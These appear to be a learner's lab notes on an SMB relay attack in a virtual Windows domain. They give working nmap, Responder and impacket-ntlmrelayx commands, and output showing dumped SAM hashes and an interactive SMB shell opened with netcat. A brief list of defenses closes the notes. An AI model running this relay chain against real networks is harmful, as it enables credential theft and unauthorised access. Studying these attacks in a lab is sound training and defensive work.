**SMB Relay**
<br/>
<br/>
what is it.. instead of cracking hashes obtained with repsonder.<br/>
<br/>
attempt to relay hashes to specific machines to potentially gain access<br/>
<br/>
REQUIREMENTS<br/>
<br/>
SMB signing must be disabled on the target<br/>
Relayed user creds must be admin on the machine<br/>
<br/>
instead of just capturing hash, send the hash to other machine. if has is admin, gain access and start dumping sensitive information including SAM file. can escilate to shell<br/>
<br/>
Discover Hosts iwth SMB signing disabled<br/>
<br/>
sudo nmap --script=smb2-security-mode.nse -p445 192.168.247.0/24<br/>
<br/>
just learnt!!! &gt;&gt;&gt; if a tool isnt playing nice... SUDO!<br/>
<br/>
<br/>
Nmap scan report for 192.168.247.133<br/>
Host is up (0.000091s latency).<br/>
<br/>
PORT  STATE SERVICE<br/>
445/tcp open microsoft-ds<br/>
MAC Address: 00:0C:29:E0:C0:FC (VMware)<br/>
<br/>
Host script results:<br/>
| smb2-security-mode: <br/>
|  3.1.1: <br/>
|_  Message signing enabled and required &gt;&gt;&gt;&gt; expected on by default on servers. cannot relay to DNS sever<br/>
<br/>
Nmap scan report for 192.168.247.134<br/>
Host is up (0.00026s latency).<br/>
<br/>
PORT  STATE SERVICE<br/>
445/tcp open microsoft-ds<br/>
MAC Address: 00:0C:29:02:17:E4 (VMware)<br/>
<br/>
Host script results:<br/>
| smb2-security-mode: <br/>
|  3.1.1: <br/>
|_  Message signing enabled but not required &gt;&gt;&gt;&gt;&gt; not required so can attack<br/>
<br/>
Nmap scan report for 192.168.247.135<br/>
Host is up (0.00019s latency).<br/>
<br/>
PORT  STATE SERVICE<br/>
445/tcp open microsoft-ds<br/>
MAC Address: 00:0C:29:BD:DF:9B (VMware)<br/>
<br/>
Host script results:<br/>
| smb2-security-mode: <br/>
|  3.1.1: <br/>
|_  Message signing enabled but not required<br/>
<br/>
<br/>
Set up a targets.txt<br/>
<br/>
TIME FOR ATTACK<br/>
<br/>
edit responder config<br/>
<br/>
gedit /etc/responder/Responder.conf <br/>
<br/>
turn off SMB<br/>
turn off HTTP<br/>
<br/>
re run responder<br/>
<br/>
sudo responder -I eth0 -dwv <br/>
<br/>
<img height="600" src="image.png" width="352"/><br/>
<br/>
SET UP RELAY<br/>
<br/>
impacket-ntlmrelayx -tf targets.txt -smb2support<br/>
<br/>
Note differnt from heaths example. had to add the &quot;impacket-&quot; and no &quot;.py&quot;<br/>
<br/>
emulate traffic by going to VM1 (has admin accross both) and navigating to attacker. use \\&lt;ip&gt; in address bar<br/>
<br/>
ntlmrelayx passes hash to target machine VM2 connects and dumps SAM hashes<br/>
<br/>
<img height="400" src="image 2.png" width="623"/><br/>
<br/>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:53dfc04147dd08ee2761f307750ebaeb:::<br/>
Jean Grey:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
<br/>
Access enabled... lateral.. vertical.. all the al<br/>
<br/>
CREATING A SHELL<br/>
<br/>
add -i to impacket-ntlmrelayx -tf targets.txt -smb2support &gt;&gt; attempt to get an &quot;interactive&quot;<br/>
<br/>
same process as above<br/>
<br/>
ntlmrelayx<br/>
<br/>
[*] SMBD-Thread-4: Connection from MARVEL/LHOWLETTE@192.168.247.135 controlled, attacking target smb://192.168.247.134<br/>
[*] Authenticating against smb://192.168.247.134 as MARVEL/LHOWLETTE SUCCEED<br/>
[*]<b>Started interactive SMB client shell via TCP on 127.0.0.1:11000</b><br/>
[*] SMBD-Thread-4: Connection from MARVEL/LHOWLETTE@192.168.247.135 controlled, but there are no more targets left!<br/>
<br/>
<br/>
netcat this <b>127.0.0.1:11000</b><br/>
<br/>
nc 127.0.0.1 11000 <br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ nc 127.0.0.1 11000       <br/>
Type help for list of commands<br/>
# help<br/>
<br/>
open {host,port=445} - opens a SMB connection against the target host/port<br/>
login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted<br/>
kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name<br/>
login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes<br/>
logoff - logs off<br/>
shares - list available shares<br/>
use {sharename} - connect to an specific share<br/>
cd {path} - changes the current directory to {path}<br/>
lcd {path} - changes the current local directory to {path}<br/>
pwd - shows current remote directory<br/>
password - changes the user password, the new password will be prompted for input<br/>
ls {wildcard} - lists all the files in the current directory<br/>
rm {file} - removes the selected file<br/>
mkdir {dirname} - creates the directory under the current path<br/>
rmdir {dirname} - removes the directory under the current path<br/>
put {filename} - uploads the filename into the current path<br/>
get {filename} - downloads the filename from the current path<br/>
mget {mask} - downloads all files from the current directory matching the provided mask<br/>
cat {filename} - reads the filename from the current path<br/>
mount {target,path} - creates a mount point from {path} to {target} (admin required)<br/>
umount {path} - removes the mount point at {path} without deleting the directory (admin required)<br/>
list_snapshots {path} - lists the vss snapshots for the specified path<br/>
info - returns NetrServerInfo main results<br/>
who - returns the sessions currently connected at the target host (admin required)<br/>
close - closes the current SMB Session<br/>
exit - terminates the server process (and this session)<br/>
<br/>
<br/>
# <br/>
<br/>
DEFENSES<br/>
<br/>
Enable SMB signing on ALL devices (performance hit)<br/>
<br/>
Disable NTLM authentication on network<br/>
IF kerberos fails windows will default back to NTLM anyway<br/>
<br/>
Acount Teiring<br/>
limit domain admins to specific takss<br/>
<br/>
Local admin restrictions - strick to domain servers. no local machines<br/>
prevent lateral movement<br/>
<br/>
<br/>
